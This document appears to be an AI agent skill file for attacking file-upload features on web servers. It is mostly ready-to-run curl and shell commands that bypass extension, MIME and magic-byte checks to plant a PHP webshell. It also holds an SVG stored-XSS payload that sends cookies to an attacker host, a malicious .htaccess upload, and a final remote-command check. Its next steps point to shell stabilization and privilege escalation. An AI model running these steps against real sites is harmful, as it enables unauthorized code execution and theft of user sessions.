---
name: vuln-file-upload
description: "File upload vulnerability testing — extension bypass, MIME type bypass, magic bytes bypass, double extension, null byte, polyglot files, webshell upload, path traversal via filename. Triggers: 'file upload', 'file upload bypass', 'unrestricted upload', 'webshell upload', 'rce via upload', 'extension bypass', 'mime bypass', 'image upload rce'."
---

# File Upload Vulnerability Testing

Systematically bypass upload restrictions to achieve webshell execution or stored XSS.

## Phase 1: Baseline Reconnaissance

```bash
TARGET="https://TARGET"
UPLOAD_EP="/upload"

for ext in jpg jpeg png gif bmp svg pdf txt zip php php5 phtml phar asp aspx; do
  response=$(curl -s -X POST "${TARGET}${UPLOAD_EP}" \
    -F "file=@/dev/urandom;filename=test.${ext};type=image/jpeg" | head -c 200)
  echo "[${ext}] ${response:0:100}"
done
```

## Phase 2: Extension Bypass

```bash
# Alternative server-side extensions
for ext in php php2 php3 php4 php5 php6 php7 php8 phtml phar phps pht shtml; do
  curl -s -X POST "${TARGET}${UPLOAD_EP}" \
    -F "file=@/tmp/shell.php;filename=shell.${ext};type=image/jpeg" | grep -E "url|path|success"
done

# Double extension
curl -s -X POST "${TARGET}${UPLOAD_EP}" -F "file=@/tmp/shell.php;filename=shell.php.jpg"
curl -s -X POST "${TARGET}${UPLOAD_EP}" -F "file=@/tmp/shell.php;filename=shell.jpg.php"

# Case variation
curl -s -X POST "${TARGET}${UPLOAD_EP}" -F "file=@/tmp/shell.php;filename=shell.PHP"
curl -s -X POST "${TARGET}${UPLOAD_EP}" -F "file=@/tmp/shell.php;filename=shell.PhP"
```

## Phase 3: MIME Type Bypass

```bash
curl -s -X POST "${TARGET}${UPLOAD_EP}" \
  -F "file=@/tmp/shell.php;type=image/jpeg"

curl -s -X POST "${TARGET}${UPLOAD_EP}" \
  -F "file=@/tmp/shell.php;type=image/png"

curl -s -X POST "${TARGET}${UPLOAD_EP}" \
  -F "file=@/tmp/shell.php;type=application/octet-stream"
```

## Phase 4: Magic Bytes Bypass

```bash
# Prepend GIF magic bytes
printf 'GIF89a\nSHELL_PAYLOAD' > /tmp/shell.gif.php
curl -s -X POST "${TARGET}${UPLOAD_EP}" \
  -F "file=@/tmp/shell.gif.php;filename=shell.gif.php;type=image/gif"

# JPEG magic bytes via Python
python3 -c "
with open('/tmp/jpegshell.php', 'wb') as f:
    f.write(bytes([0xFF,0xD8,0xFF,0xE0]))
    f.write(b'\nSHELL_PAYLOAD')
"
```

## Phase 5: SVG XSS and .htaccess Upload

```bash
# SVG for stored XSS
cat > /tmp/xss.svg << 'EOF'
<?xml version="1.0" standalone="no"?>
<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
  <script><![CDATA[fetch('https://ATTACKER.com/'+document.cookie)]]></script>
</svg>
EOF
curl -s -X POST "${TARGET}${UPLOAD_EP}" -F "file=@/tmp/xss.svg;type=image/svg+xml"

# .htaccess upload to make .jpg execute as PHP (Apache)
printf 'AddType application/x-httpd-php .jpg\n' > /tmp/.htaccess
curl -s -X POST "${TARGET}${UPLOAD_EP}" -F "file=@/tmp/.htaccess;filename=.htaccess;type=text/plain"
```

## Phase 6: RCE Confirmation

```bash
for path in /uploads /upload /files /media /images /assets /static/uploads; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}${path}/shell.php")
  echo "${code} ${path}/shell.php"
done

curl "${TARGET}/uploads/shell.php?cmd=id"
```

## Output

Save to `/workspace/output/`:
- `upload-results.txt` — which techniques succeeded
- `shell-url.txt` — webshell URL and proof

## Next Phase

→ `vuln-rce` for shell stabilization
→ `post-linux-privesc` after shell obtained
